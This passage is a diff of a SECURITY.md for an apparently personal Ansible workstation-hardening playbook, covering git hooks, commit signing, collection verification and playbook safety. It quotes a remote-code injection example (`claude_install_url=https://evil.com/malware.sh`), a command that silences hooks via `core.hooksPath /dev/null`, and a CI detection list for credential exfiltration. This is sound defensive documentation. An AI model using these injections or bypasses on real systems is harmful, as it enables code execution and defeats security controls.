@@ -7,713 +7,324 @@ If you discover a security vulnerability, please report it privately via
 
 Do not open a public issue for security vulnerabilities.
 
-## Quick Reference
-
-Navigate to your task below:
-
-### Setup Workflows
-
-- [YubiKey + vault-pass.sh](#setting-up-vault-passsh) — Program HMAC-SHA1 for vault encryption
-- [GPG key generation/import](#gpg-key-requirements-for-supply-chain-commits) — Set up commit signing
-- [SSH key pair generation](#ssh-key-rotation) — Create ed25519-sk FIDO2 keys
-- [Configure git signing](#gpg-key-requirements-for-supply-chain-commits) — Enable automatic GPG signatures
-
-### Security Incident Response
-
-- [Lost/compromised YubiKey](#lost-or-compromised-yubikey) — Recovery via backup password or re-keying
-- [GPG key compromise](#sha256sums-signing-key-management) — Key rotation procedure
-- [Vault password recovery](#lost-or-compromised-yubikey) — Restore vault access without YubiKey
-
-### Policy & Operations
-
-- [Git hook bypass rules](#unsafe-git-operations) — When (and never) to use --no-verify
-- [Supply-chain commit requirements](#supply-chain-commits-critical-distinction-between--s-and--s-flags) — -s and -S flag distinction
-- [Go module supply chain risk](#go-module-supply-chain) — Mitigation tiers and hardening options
-
 ## Scope
 
 This is a personal workstation provisioning playbook. Security-relevant areas:
 
-- **Ansible Vault** — secrets template in `group_vars/all/vault.yml`
-  (encrypt after populating)
-- **SSH key management** — YubiKey FIDO2 key deployment, post-quantum
-  key exchange
-- **System hardening** — firewall (drop zone), sysctl (the sysctl hardening set
-  in roles/system/defaults/main.yml: system_sysctl_hardening plus toggle-driven
-  keys),
-  auditd (user persistence monitoring, immutable rules), kernel lockdown,
-  SELinux enforcing (targeted), USBGuard, crypto policy DEFAULT:NO-SHA1,
-  DNS-over-TLS/DNSSEC (FallbackDNS: Quad9; default opportunistic DoT +
-  allow-downgrade DNSSEC — on untrusted networks an on-path attacker can block TCP 853
-  to force plain UDP 53, then strip DNSSEC records to bypass validation; set
-  `system_dot_mode: yes` + `system_dnssec_mode: yes` in config.yml for strict
-  enforcement, noting strict mode breaks captive portals), core dump disable,
-  io_uring restricted to CAP_SYS_ADMIN (kernel.io_uring_disabled=1; set 2 in config.yml to disable for all users), kernel
-  module blacklist (incl. usb-storage/uas when system_disable_usb_storage: true), cups-browsed/avahi masking,
-dnf-automatic,
-  /tmp nosuid/nodev (noexec opt-in via `system_tmp_noexec`; CIS 1.1.2.x),
-  /var/tmp nosuid/nodev/noexec (CIS 1.1.8, bind-mount), /dev/shm nosuid/nodev/noexec
-  (CIS 1.1.7.x), /home nosuid/nodev (CIS 1.1.9), /boot nosuid/nodev/noexec, /boot/efi nosuid/noexec (vfat — nodev not applicable), home
-  directory 0700 (CIS 6.2.x, `system_home_mode`, non-RHEL-CSB), NFS server /
-  rpcbind masked (CIS 2.2.7), auditd user-mgmt tool watches — chsh/chfn/newgrp/su
-  (CIS 4.1.3.8), pam_wheel.so (su restricted to wheel),
-  root account locked, inactive account lockout chage -I 30 (CIS 5.5.1.5),
-AIDE file integrity monitoring (daily; disabled by default — set
-  system_aide_enabled: true in config.yml only when a log consumer is in place).
-  /etc/NetworkManager/system-connections is excluded because connection profiles
-  change whenever a network is added. A weekly setuid/setgid binary scan
-  (setuid-scan.timer) complements AIDE. chrony NTS
-(authenticated time sync), DHCP hostname privacy (NM conf.d 99-dhcp-privacy.conf — suppresses hostname advertisement to DHCP servers on
-  all but RHEL CSB hosts)
-- **Git security** — `core.fsmonitor=false`, `safe.bareRepository=explicit`,
-  `transfer.fsckObjects=true`,
-  `protocol.file.allow=user`, SSH commit signing, gitleaks pre-commit,
-  `core.hooksPath` immutability guard (CI + hook validation)
-- **Claude Code isolation** — instance separation, sandbox config, file
-  access deny lists for credential paths (read+edit), Ansible-managed config
-  (edit), and other Claude instances' data (incl. /proc/environ, .git/config,
-  settings.json self-modify protection), API endpoint guard,
-  telemetry controls, `enableAllProjectMcpServers=false`, auditd monitoring
-- **Supply chain** — `.npmrc ignore-scripts=true`, Ansible collection
-  verification, Chrome extension allowlisting, binary SHA256 verification,
-  oh-my-zsh pinned to commit SHA, Go module checksum verification with GOSUMDB
-  (see "Go Module Supply Chain" section below)
-- **CI supply chain** — actionlint, zizmor, and gitleaks run as
-  SHA256-verified binary downloads instead of third-party node actions;
-  all GHA actions SHA-pinned by commit hash; OSSF Scorecard weekly
-- **Git hook integrity** — Pre-commit hooks validated at three levels:
-  (1) Syntax validation (shellcheck), (2) Behavioral intent validation (CI scans
-  for exfiltration patterns), (3) Mandatory code review for .githooks/* changes
-  (branch protection rule). All hooks run with user privileges via
-  `core.hooksPath = .githooks` (set by `make hooks`, called by `make bootstrap`).
-  Hook modifications
-  MUST be reviewed by maintainers before merge — never bypass with `--no-verify`
-  on hook changes (see "Unsafe git operations" below)
-- **Privilege escalation** — `become_exe = /usr/bin/sudo` in ansible.cfg
-  prevents PATH-based sudo trojan attacks
-- **Branch protection** — main requires every lint and supply-chain job by name
-  (see the `needs:` list of `all-checks-pass` in `.github/workflows/linting.yml`),
-  the per-platform Molecule jobs, and both aggregates: `All Checks Pass` and
-  `All Molecule Checks Pass`. Renaming a job blocks merges until branch protection
-  is updated. The `all-checks-pass` job aggregates the supply-chain checks (GPG
-  signatures, Signed-off-by, collections integrity, script integrity); force push
-  and deletion blocked; linear history enforced
-- **Secret scanning** — GitHub secret scanning and push protection
-  enabled (server-side complement to gitleaks pre-commit hook)
-- **Browser hardening** — 41 Chrome/Chromium managed policies (HTTPS-only,
-  site isolation, WebRTC, download restrictions, remote debugging blocked)
-- **Desktop hardening** — GNOME lock screen notifications hidden, USB
-  automount disabled, RDP/VNC disabled, idle lock at 300s (GNOME dconf,
-  i3 via xss-lock + i3lock, Sway via swayidle + swaylock at 300s lock /
-  600s display off)
+- **Ansible Vault** — secrets template in `group_vars/all/vault.yml` (encrypt after populating)
+- **SSH key management** — YubiKey FIDO2 key deployment, post-quantum key exchange
+- **System hardening** — the defaults are in `roles/system/defaults/main.yml`; highlights: firewalld drop zone, sysctl hardening set,
+  auditd (immutable rules, user persistence monitoring), kernel lockdown, SELinux enforcing, USBGuard, crypto policy `DEFAULT:NO-SHA1`,
+  DNS-over-TLS/DNSSEC, core dump disable, io_uring restricted, kernel module blacklist, mount options
+  (`/tmp`, `/dev/shm`, `/home`, `/boot`),
+  0700 home directories, `pam_wheel` for `su`, root account locked, inactive account lockout, cups-browsed/avahi/NFS masking, optional AIDE
+  and weekly setuid scan, chrony NTS, dnf-automatic. Corporate-managed (CSB-detected) hosts skip chrony time sync and dnf-automatic
+  updates; RHEL CSB also skips boot config and firewall zones (Fedora hybrid CSB keeps them). Opportunistic DoT with `allow-downgrade`
+  DNSSEC lets an on-path attacker force plain DNS; set `system_dot_mode: yes` and `system_dnssec_mode: yes` for strict enforcement (breaks
+  captive portals)
+- **Git security** — `core.fsmonitor=false`, `safe.bareRepository=explicit`, `transfer.fsckObjects=true`, `protocol.file.allow=user`,
+  SSH commit signing, gitleaks pre-commit, `core.hooksPath` guard (CI and hooks)
+- **Claude Code isolation** — instance separation, sandbox config, deny lists for credential paths and other instances' data,
+  settings self-modify protection, API endpoint guard, telemetry controls, `enableAllProjectMcpServers=false`, auditd monitoring
+- **Supply chain** — `.npmrc ignore-scripts=true`, vendored and verified Ansible collections, SHA256-verified
+  binary downloads, oh-my-zsh pinned to a commit, Go module checksum verification (see "Go Module Supply Chain")
+- **CI supply chain** — actionlint, zizmor and gitleaks run as SHA256-verified binary downloads (no third-party node actions); all GitHub
+  Actions are SHA-pinned; OSSF Scorecard runs weekly
+- **Privilege escalation** — `become_exe = /usr/bin/sudo` in `ansible.cfg` prevents PATH-based sudo trojans
+- **Desktop hardening** — lock screen notifications hidden, USB automount disabled, idle lock (GNOME dconf, i3lock,
+  swaylock; timeouts in
+  `roles/desktop/defaults/main.yml` and `system_logind_idle_sec`)
+- **Secret scanning** — GitHub secret scanning and push protection (server-side complement to the gitleaks hook)
 
-Audit setup prepares watch directories with private ownership for user data;
-it leaves absent credential files absent so the kernel can watch their later
-creation. Noise exclusions are compiled only for executables already installed.
-The root-owned `/etc/audit/claude-code-policy.json` receipt preserves the validated
-rules when configuration is unchanged, even if more tools are installed later.
-Changing immutable audit rules requires a reboot; restarting auditd cannot unlock
-`-e 2`. Audit daemon configuration reloads separately without clearing rules.
+Audit rules watch credential directories; absent credential files stay absent so the kernel can watch their later creation. Changing
+immutable audit rules (`-e 2`) requires a reboot; restarting auditd cannot unlock them.
 
 ## Cryptographic Identities Registry
-
-This table documents the four distinct cryptographic keys used throughout provisioning and deployment. Refer to the appropriate row when
-updating keys or import instructions.
 
 | Identity | Purpose | Key ID / Comment |
 | --- | --- | --- |
 | Collections signing | Owner signature of vendored checksums | Placeholder; no active public key is bundled |
-| User GPG key | Commit signing (supply-chain files) | Generated during setup (§ GPG Key Requirements for Supply-Chain Commits) |
+| Commit signing key | Commit signatures (when enforced) | SSH `ed25519-sk` signing key (default) or a GPG key |
 | SSH auth key | GitHub/internal git authentication | `ed25519-sk` (§ SSH Key Rotation) |
-| SSH signing key | Git commit signing via SSH | `ed25519-sk` (§ SSH Key Rotation) |
+| Vault password | Ansible Vault | Derived from YubiKey HMAC-SHA1 (§ Vault Security) |
 
 ## Git Hooks Protection (core.hooksPath)
 
-Git hooks enforce critical security policies:
+Hooks live in `.githooks/` and run with user privileges; `make hooks` (called by `make bootstrap`) sets
+`git config --local core.hooksPath .githooks`.
 
-- Pre-commit hook blocks unencrypted vault files, detects secrets (gitleaks),
-  validates YAML/shell syntax, and verifies collections-dist/ integrity
-- Commit-msg hook enforces --signoff requirement and rejects past-tense and gerund
-  first words (established project convention)
+- `pre-commit` blocks unencrypted vault files, runs gitleaks (blocks if gitleaks is missing), lints staged YAML/shell/JSON, and checks the
+  SHA256 baselines for hooks, scripts and `collections-dist/`
+- `commit-msg` requires `Signed-off-by:`, enforces the `Scope: noun-phrase` convention, and requires `commit.gpgsign=true` for
+  core supply-chain files when `.gpg-enforcement` is `enabled`
+- `pre-push` re-checks vault encryption, signoff, signing policy and gitleaks for every pushed ref
+- `prepare-commit-msg` fails when `core.hooksPath` points at a missing directory
 
-### Core protection: core.hooksPath immutability
-
-The hooks path is set by `make hooks` (called by `make bootstrap`):
-
-```bash
-git config --local core.hooksPath .githooks
-```
-
-Local config takes precedence over global, creating a bypass risk: an attacker
-with repo write access can override with `git config --local core.hooksPath
-/dev/null`, silencing all hooks. **Do NOT override this setting.**
-
-### CI enforcement (linting.yml)
-
-- `git-config-guards` job verifies that the Makefile's `make hooks` recipe still sets
-  core.hooksPath to `.githooks` and that no hook in `.githooks/` writes
-  core.hooksPath (push + PR)
-- CI cannot see a developer's local config: a local `core.hooksPath` override is
-  not enforceable by CI; the job only checks that the repo's installer and hooks
-  do not rewrite it
+A local `git config --local core.hooksPath /dev/null` silences hooks. CI cannot see a developer's local config; the `git-config-guards` job
+only verifies that the `make hooks` recipe still sets `.githooks` and that no hook or commit in a PR writes `core.hooksPath`.
+**Do not override this setting.**
 
 ### Hook bypass prohibition
 
-- **DO NOT use `git commit --no-verify`** — bypasses pre-commit hook checks
-  (vault encryption, secrets scanning, syntax validation)
-- **DO NOT use `git push --no-verify`** — FORBIDDEN. This bypasses the pre-push
-  hook completely; Git will not invoke the hook when --no-verify is specified.
-  The hook has no ability to detect or prevent this bypass. Unencrypted vault
-  files can be pushed to any branch, accumulating secrets in git history before
-  CI status checks prevent merge to main. See "Pre-push hook limitation" below.
+**Never use `git commit --no-verify` or `git push --no-verify`.** Git does not invoke hooks at all with `--no-verify`, so no hook can detect
+it. The pre-commit hook guards vault encryption, secret scanning and collections integrity; tarballs modified without a matching
+`collections-dist/SHA256SUMS` would otherwise reach a PR branch before CI runs. Unencrypted vault files pushed with `--no-verify` land in
+history on the server before CI can reject the PR.
 
-### Enforcement summary
+Compensating controls:
 
-1. Local hooks path is `.githooks` (set by `make hooks`, called by `make bootstrap`)
-2. CI rejects hook changes that write core.hooksPath (a developer's local setting is not checked by CI)
-3. All commits require --signoff (enforced by commit-msg hook + CI)
-4. Vault files must be encrypted (enforced by pre-commit hook + CI on pull requests to and pushes to main)
-5. No commits to main without PR + CI passing (branch protection)
+1. CI job `vault-encryption` runs on pull requests to main and on pushes to main (feature-branch pushes without a PR are not scanned)
+2. It is a required status check on main, so unencrypted secrets cannot merge
+3. Other required checks (`Secret Detection`, `Git Config Guards`) cover secrets and hook tampering
 
-This defense-in-depth prevents attackers from committing unencrypted secrets,
-unsigned commits (when signing enforcement is enabled), or tampered collections even if they have direct repo write
-access.
+There is no safe bypass: no hook honours an environment override, and the only CI environment override is `SKIP_GPG_VERIFY=1`, which skips
+just the missing-key GPG check in collection verification. Fix the failing check instead. The only exception is a CI-only
+workflow step, and only when the commit is entirely CI-generated, the workflow is sealed, and earlier gates validated the content.
 
-### Pre-push hook limitation: --no-verify bypass
+### Hook changes require review
 
-**Vulnerability**: The pre-push hook cannot prevent the `git push --no-verify`
-operation. Git's documented behavior (per `git help push`) is that `--no-verify`
-bypasses hooks completely — the hook script is never invoked. The hook has no
-ability to detect that `--no-verify` was used because it is not called at all.
+Changes to `.githooks/pre-commit`, `.githooks/commit-msg` and `.githooks/pre-push` are validated three ways: shellcheck (syntax), a CI
+behavioral scan, and owner review. `.githooks/prepare-commit-msg` is not shellcheck-ed or behaviorally scanned in CI; its changes get only
+the CI `core.hooksPath` write check and owner review.
 
-**Attack vector**: A developer or attacker with repo write access can execute
-`git push --no-verify` to push unencrypted vault files to any branch, bypassing
-the client-side hook check. Unencrypted secrets accumulate in git history on
-the server before CI status checks prevent merge to main.
+- The CI scan rejects `curl`/`wget`/`nc` with URLs, `cat` of `~/.ssh`, `~/.gnupg`, `~/.aws` or gcloud paths, and credential exports
+  (`AWS_*`, `GOOGLE_*`, `GCP_*`, `GITHUB_TOKEN`)
+- `.github/CODEOWNERS` lists the owner. Branch protection does not require approving reviews, so review is the owner's discipline;
+  required status checks, linear history, no force push and no deletion are enforced
 
-**Mitigations implemented**:
+## Supply-Chain Validation
 
-1. **Client-side education** — SECURITY.md (this file, § Hook bypass prohibition) explicitly
-   forbids `git push --no-verify` as a violation of security policy. Developers
-   are educated that this operation cannot be prevented at the hook level.
+Branch protection on main requires every job in the `needs:` list of `all-checks-pass` in `.github/workflows/linting.yml`, the
+per-platform Molecule jobs, and the aggregates `All Checks Pass`, `All Molecule Checks Pass` and `Supply-Chain Validation Gate`. Renaming
+or deleting a job blocks merges until branch protection is updated. The supply-chain checks are `GPG Signature Verification` (signoff, plus
+signatures when enforced), `Node Lint` (signoff, commit conventions, npm lockfile), `Secret Detection`, `Script Integrity Check` and the
+collections jobs.
 
-2. **Server-side CI validation** — CI job `vault-encryption`
-   (linting.yml) runs on pull requests targeting main and on pushes to main
-   (feature-branch pushes without a PR are not scanned). This catches unencrypted vault files before they
-   accumulate in git history, regardless of `--no-verify` usage.
-
-3. **Branch protection on main** — Vault encryption check is a required status
-   check for main, preventing merge of unencrypted secrets even if CI runs on
-   a PR branch.
-
-4. **Commit history scanning** — Future mitigations (not yet implemented):
-   - Implement post-receive hook on the Git server (if self-hosted) to validate
-     all commits for unencrypted vault files
-
-**Recommendation**: Treat `git push --no-verify` as a forbidden operation
-equivalent to `git commit --no-verify`. If a push becomes blocked by the hook,
-fix the underlying issue (encrypt vault files) rather than bypassing the check.
-The server-side CI catch ensures that even `--no-verify` usage is detected
-before merge, but it is still a violation of security policy.
-
-## Unsafe Git Operations
-
-**NEVER use `git commit --no-verify` or `git push --no-verify`.** The pre-commit hook (.githooks/pre-commit) enforces three critical gates:
-
-1. Vault encryption — blocks plaintext vault files
-2. Secret scanning (gitleaks) — detects hard-coded credentials
-3. Collections supply chain — enforces `collections-dist/SHA256SUMS` update when tarballs are modified
-
-**Why this matters**: Collections tarballs (`collections-dist/*.tar.gz`) modified without a matching `SHA256SUMS` update bypass the
-pre-commit hook check (`collections-dist/*.tar.gz` baseline guard).
-An unverified tarball can reach the PR branch before `collections-integrity` CI validation runs. This
-is a concrete, exploitable codebase vulnerability — supply chain tampering via unsigned collections.
-
-**Exception: CI-only scenarios** — in GitHub Actions workflows, using `--no-verify` is acceptable ONLY when:
-
-- The workflow is sealed (no untrusted input)
-- The commit is entirely CI-generated (not developer code)
-- Earlier CI gates have validated commit content
-
-Never use `--no-verify` in local development or on developer machines. See § "Git Hooks Protection" for architecture details on why
-pre-push bypass is unpreventable at the hook level.
-
-## Git Hook Security and Signing
-
-### Hook modifications require mandatory code review
-
-The `.githooks/` directory contains scripts that execute with user privileges during `git commit` and `git commit-msg` . Attacks on these
-hooks can steal SSH keys, GPG keys, AWS credentials, and other secrets.
-
-All PRs modifying `.githooks/*` undergo three layers of validation:
-
-1. **Syntax validation (CI shellcheck)** — ensures valid bash syntax
-2. **Behavioral validation (CI linting)** — scans for exfiltration patterns:
-   - curl/wget/nc with URLs
-   - cat/grep of sensitive paths (~/.ssh, ~/.gnupg, ~/.aws, ~/.gcloud)
-   - credential exports (AWS_*, GITHUB_TOKEN, etc.)
-3. **Code review (GitHub branch protection)** — mandatory human review before merge
-
-### Supply-Chain Commits: Critical Distinction Between -s and -S Flags
-
-**SECURITY ISSUE**: The error message conflating `-s` and `-S` creates dangerous confusion about what signatures are actually being
-verified.
-
-When `.gpg-enforcement` is enabled, commits modifying critical supply-chain files
-(scripts, SHA256SUMS, .githooks) require BOTH flags. These are TWO COMPLETELY DIFFERENT
-security mechanisms:
+## Supply-Chain Commits: -s vs -S
 
 | Flag | Full name | Cryptographic? | Purpose | Verification |
 | --- | --- | --- | --- | --- |
-| `-s` | `--signoff` | **NO** | Adds `Signed-off-by:` text to the message body | Commit-msg hook and CI regex |
-| `-S` | `--gpg-sign` | **YES** | Signs the commit object | `git verify-commit` |
+| `-s` | `--signoff` | No | Adds a `Signed-off-by:` text trailer | commit-msg hook and CI regex |
+| `-S` | `--gpg-sign` | Yes | Signs the commit object | `git verify-commit`, GitHub verification |
 
-### What developers must understand
-
-- `-s` alone creates a **deceptive false sense of security** — it only adds text, not cryptography
-- `-S` alone verifies cryptographic integrity but does NOT prove developer authorship statement
-- **BOTH are required in enforced mode** for supply-chain commits: authorship commitment (-s) + integrity proof (-S)
-
-### Attack scenario illustrating the vulnerability
-
-1. Developer runs `git commit -s` (only the `-s` flag) on a supply-chain file
-2. The commit message contains `Signed-off-by: Developer Name`
-3. CI job checks `git verify-commit` which returns N (no GPG signature)
-4. CI **correctly rejects** the commit as unsigned
-5. **Problem**: The error message says "Sign your commits with: git commit -s -S" without explaining the difference
-6. **Confused developer** thinks `-s` *is* a signature, not realizing they need `-S` for cryptography
-7. They may resort to `git commit --no-verify -s` (dangerous bypass)
-
-### Why both mechanisms are critical
-
-- **-s (Signed-off-by) proves developer authorship** — Developer is committing to the content and taking responsibility
-- **-S (GPG signature) proves commit integrity** — Commit object has not been tampered with (unforgeable without private key)
-
-### Example: Correct supply-chain commit with both mechanisms
+`-s` alone is only text. When `.gpg-enforcement` is `enabled`, commits touching supply-chain paths (`scripts/`, `.githooks/`,
+`collections-dist/`, `.github/`, `Makefile`, `Makefile.sha256`, `roles/packages/defaults/main.yml`,
+`roles/repos_dnf/defaults/main.yml`, root-level `requirements-test.lock`, `requirements-bootstrap.txt`, `package.json`,
+`package-lock.json`, `.gitleaks.toml`, `.gpg-enforcement`) need both:
 
 ```bash
 git commit -s -S -m "Scripts: update verify-collections.sh"
-
-# Result commit contains:
-#   - Commit message with: Signed-off-by: Your Name <you@example.com>
-#   - Commit object with: GPG signature (good signature from "Your Name")
-#   - git verify-commit returns: Good signature (status: G)
-#   - git log --format=%B shows: Signed-off-by: text trailer
+git verify-commit HEAD
+git log -1 --format=%B HEAD | grep '^Signed-off-by:'
 ```
 
-### Local enforcement (.githooks/commit-msg)
-
-- Rejects commits missing a `Signed-off-by:` trailer (checked first, before any early exit)
-- Supply-chain file changes require `commit.gpgsign=true` when the staged policy enables enforcement
-- Error messages clearly separate the checks
-
-### CI enforcement (linting.yml, gpg-signatures job)
-
-- **GPG signature check** (cryptographic, when enabled): GitHub signature verification in CI
-- **Signed-off-by check** (text): grep for `^Signed-off-by:` in commit message
-- Both must pass; failure explains the distinction
-
-### Configuration (one-time setup)
-
-```bash
-# Option 1: Configure git to ALWAYS GPG-sign (recommended for supply-chain work)
-git config --global commit.gpgsign true
-
-# Then all commits automatically get both mechanisms:
-git commit -s                    # -s is still needed; -S comes from config
-
-# Option 2: Sign supply-chain commits manually
-git commit -s -S -m "message"   # Explicit signoff + signature
-```
-
-### Post-deployment testing
-
-To verify a commit has both mechanisms:
-
-```bash
-commit_sha="abc123..."
-
-# Verify GPG signature (cryptographic)
-git verify-commit "$commit_sha"
-git show --format=%G? -s "$commit_sha"  # Should print: G (good), U (untrusted), or R (revoked)
-
-# Verify Signed-off-by trailer (text)
-git log -1 --format=%B "$commit_sha" | grep '^Signed-off-by:'
-```
-
-### Current hook safety practices
-
-```bash
-# SAFE: Development workflow — all checks active
-git add .githooks/my-new-check.sh
-git commit -m "Githooks: add new pre-push validation"  # hooks run, must pass
-
-# UNSAFE: Bypassing hook validation
-git commit --no-verify -m "Skip hooks"  # DO NOT DO THIS
-
-# There is no safe bypass: no hook or CI job honours an environment override.
-# Fix the failing check instead of skipping it.
-```
-
-## Ansible Playbook Safety
-
-**Do NOT use `--start-at-task` with site.yml** — Ansible's `--start-at-task` flag
-skips all `pre_tasks` in the target play, including critical security validations.
-The pre-flight checks (`common/tasks/pre_flight_checks.yml`) validate `claude_install_url`
-is constrained to safe domains (`claude.ai` or `anthropic.com`). Using
-`--start-at-task` with any task name would bypass this validation, allowing
-`-e 'claude_install_url=https://evil.com/malware.sh'` to inject and execute
-arbitrary code. **Workaround:** run `make all` (full provisioning) or `make minimal`
-instead. If you must re-run a subset of tasks:
-
-```bash
-# SAFE: Run from a specific role tag (full play pre_tasks still execute)
-ansible-playbook site.yml -t dotfiles,repos
-
-# UNSAFE: Skips all pre_tasks, including security validations
-# DO NOT USE:
-ansible-playbook site.yml --start-at-task 'Some Task Name'
-```
-
-Defense-in-depth: the `claude` role re-validates `claude_install_url` before
-download (line 6-17 in roles/claude/tasks/main.yml), so even `--start-at-task`
-bypasses cannot reach RCE without also modifying the role's validation.
-
-## Git Security
-
-See § "Unsafe Git Operations" above for complete guidance on `--no-verify` restrictions. This project's collections supply chain requires
-care — tampering with `collections-dist/*.tar.gz` without updating `SHA256SUMS` bypasses pre-commit hooks and reaches the PR branch before
-CI runs. Architectural detail on the hook-level pre-push bypass is in "Git Hooks Protection" § "Pre-push hook limitation: --no-verify
-bypass".
+With `commit.gpgsign=true` configured, `git commit -s` is enough because `-S` comes from config.
 
 ## Temporary Repository GPG Policy
 
-`.gpg-enforcement` is currently `disabled`. Commit and push hooks and CI continue
-requiring `Signed-off-by:` and secret scans, but do not require cryptographic commit
-signatures. Collection verification skips GPG while still enforcing archive SHA256,
-Galaxy API digests, installed source comparison and the complete Python manifest.
-Package repository signature checks and binary download verification remain active.
-No authenticated owner signature is claimed while this policy is disabled.
+`.gpg-enforcement` is currently `disabled`. Commit and push hooks and CI keep requiring `Signed-off-by:` and secret scans, but not
+cryptographic commit signatures. Collection verification skips GPG while still enforcing archive SHA256, Galaxy API digests, installed
+source
+comparison and the complete Python manifest. Package repository signature checks and binary download verification stay active. No
+authenticated owner signature is claimed while the policy is disabled.
 
-With `.gpg-enforcement` set to `disabled`, the `GPG Signature Verification` check verifies
-only the `Signed-off-by:` text trailer on commits touching supply-chain files. It does not
-verify cryptographic signatures. The `*.sha256` baseline files (for example
-`.githooks/pre-commit.sha256` and `Makefile.sha256`) catch accidental edits only: they change
-in the same commit as the file they cover, so an attacker with write access can update both.
+With the policy disabled, the `GPG Signature Verification` check verifies only the `Signed-off-by:` trailer on commits touching supply-chain
+files. The `*.sha256` baselines (for example `.githooks/pre-commit.sha256`, `Makefile.sha256`) catch accidental edits only: they change in
+the same commit as the file they cover, so an attacker with write access can update both.
 
-The policy is tracked and parsed as data by `scripts/gpg-policy.sh`; no shell
-configuration is executed. Invalid values fail checks. A missing policy defaults to
-`enabled`. Commit hooks use the staged policy, so an unstaged edit cannot disable
-signing for a commit. The CI job keeps its existing status-check name, `GPG Signature
-Verification`, and checks signoff plus any enabled cryptographic requirement.
+`scripts/gpg-policy.sh` parses the tracked file as data; invalid values fail checks and a missing file means `enabled`. `pre-commit` and
+`commit-msg` read the staged policy (`--staged`), so an unstaged edit cannot disable signing for a commit. `pre-push` reads the
+working-tree policy, so an unstaged edit to `.gpg-enforcement` can skip its push-time signature check. Disabling is an explicit repository
+choice, not a `--no-verify` bypass.
 
 To re-enable enforcement:
 
-1. Configure and unlock a commit-signing key and register its public key on GitHub.
-2. Replace the collection placeholder key/signature as described below.
-3. Write `enabled` to `.gpg-enforcement` and stage that change.
-4. Run `git config --local commit.gpgsign true` and configure `user.signingkey`.
-5. Commit with `git commit -s -S`, then run the signature and collection checks.
+1. Configure a commit-signing key and register its public key on GitHub (see "GPG Key Requirements for Supply-Chain Commits")
+2. Replace the collection placeholder key and signature (see "SHA256SUMS Signing Key Management")
+3. Write `enabled` to `.gpg-enforcement` and stage it
+4. Run `git config --local commit.gpgsign true`
+5. Commit with `git commit -s -S`, then run the signature and collection checks
 
-The enforced-mode requirements in the following signing sections apply when the
-policy is `enabled`. The temporary disabled policy is an explicit repository
-choice, rather than a `--no-verify` hook bypass.
+## GPG Key Requirements for Supply-Chain Commits
+
+When `.gpg-enforcement` is enabled, supply-chain commits must carry a signature GitHub verifies. The dotfiles role configures SSH signing
+(`gpg.format=ssh`, key `~/.ssh/id_ed25519_sk_signing.pub`); a GPG key (RSA 4096 or ed25519) also works. Set `commit.gpgsign true` and
+`user.signingkey`, and register the public key on GitHub as a signing key. For GPG setup see the
+[GnuPG manual](https://www.gnupg.org/documentation/manuals/gnupg/) and
+[GitHub's signature verification docs](https://docs.github.com/en/authentication/managing-commit-signature-verification).
 
 ## SHA256SUMS Signing Key Management
 
-The bundled `collections-dist/signing-key.asc` is explicitly an invalid placeholder.
-`SHA256SUMS.asc` is a test signature, not verified upstream provenance. Importing the placeholder
-cannot enable verification. Replace both files with a real owner public key and a signature of
-`SHA256SUMS` before claiming authenticated owner signatures.
+The bundled `collections-dist/signing-key.asc` is an invalid placeholder and `SHA256SUMS.asc` is a test signature, not upstream provenance.
+Importing the placeholder cannot enable verification. Replace both with a real owner public key and a signature of `SHA256SUMS` before
+claiming authenticated owner signatures.
 
-When `.gpg-enforcement` is `enabled`, runtime verification in
-`scripts/verify-collections.sh` fails when the signing key is missing.
-The explicit `SKIP_GPG_VERIFY=1` option is intended for CI and other non-production checks;
-it permits a missing key, and still fails on an invalid signature when the key is present.
-Enforced-mode provisioning requires a real signing key and a valid checksum signature.
+When `.gpg-enforcement` is `enabled`, `scripts/verify-collections.sh` fails if the signing key is missing. `SKIP_GPG_VERIFY=1` (CI and other
+non-production checks) permits a missing key but still fails on an invalid signature when the key is present.
 
-`scripts/verify-collections.sh` hashes the `.py` and `.so` files under `plugins/`, `module_utils/`
-and `roles/` and compares them with the vendored tarballs in `collections-dist/`. Collections
-installed in `~/.ansible/collections` or `/usr/share/ansible/collections` are not verified.
-The script also fails on any symlink (including a symlinked or broken `collections/` root) and on an
-`__init__.py` in the collections root, namespace or collection directories (tarballs never ship one),
-and warns on stderr when a vendored collection is not installed under `collections/` (partial bootstrap).
-
-In enforced mode, CI uses the documented missing-key exception on ephemeral runners. The `collections-integrity`
-job separately verifies every vendored archive against the Galaxy API, checks the committed
-SHA256 values, and compares installed Python files with the verified archives and manifest.
-With enforcement enabled, if a real public key replaces the placeholder, CI imports
-it and also verifies the signature.
-Network or hash failures in the upstream check fail the job.
+`scripts/verify-collections.sh` hashes the `.py` and `.so` files under `plugins/`, `module_utils/` and `roles/` and compares them with the
+vendored tarballs. Collections installed in `~/.ansible/collections` or `/usr/share/ansible/collections` are not verified. It also fails on
+any symlink (including a symlinked or broken `collections/` root) and on an `__init__.py` in the collections root, namespace or collection
+directories, and warns on stderr when a vendored collection is not installed (partial bootstrap).
 
 To configure a real owner signature:
 
-1. Verify the archives against Galaxy with `scripts/verify-collections-galaxy.sh`.
-2. Export the owner's public signing key to `collections-dist/signing-key.asc`.
-3. Sign `collections-dist/SHA256SUMS` with that key and replace `SHA256SUMS.asc`.
-4. Record the verified fingerprint in the identities registry and verifier instructions.
-5. Commit the key, signature, and checksums together in a signed commit for review.
+1. Verify the archives against Galaxy with `scripts/verify-collections-galaxy.sh`
+2. Export the owner's public signing key to `collections-dist/signing-key.asc`
+3. Sign `collections-dist/SHA256SUMS` with it and replace `SHA256SUMS.asc`
+4. Record the verified fingerprint in the identities registry
+5. Commit the key, signature and checksums together in a signed commit
 
-Rotate a compromised owner key by publishing its revocation, replacing the public key and
-signature, and updating the pinned fingerprint. A signature authenticates the owner-approved
-checksums; it does not establish provenance from an Ansible Galaxy maintainer.
+Rotate a compromised owner key by publishing its revocation, replacing the public key and signature, and updating the pinned fingerprint. A
+signature authenticates owner-approved checksums; it does not establish provenance from a Galaxy maintainer. A compromised GPG
+commit-signing
+key is handled the same way: revoke it, remove it from GitHub, and re-sign.
+
+## Ansible Playbook Safety
+
+**Do not use `--start-at-task`.** It skips play-level `pre_tasks`, including the security validations, so
+`-e claude_install_url=https://evil.example/x.sh` could reach the installer. Use the scoped make targets (`make dotfiles`, `make repos`,
+`make ssh`, `make claude`, ...); they run through `scripts/verify-ansible-args.sh`. Do not run `ansible-playbook` directly.
+
+The wrapper (`VERIFY_AND_RUN` in the Makefile):
+
+- rejects `--start-at-task` (and abbreviations), `--vault-id`, `--vault-password-file`, `--skip-tags always`, `@file` extra-vars,
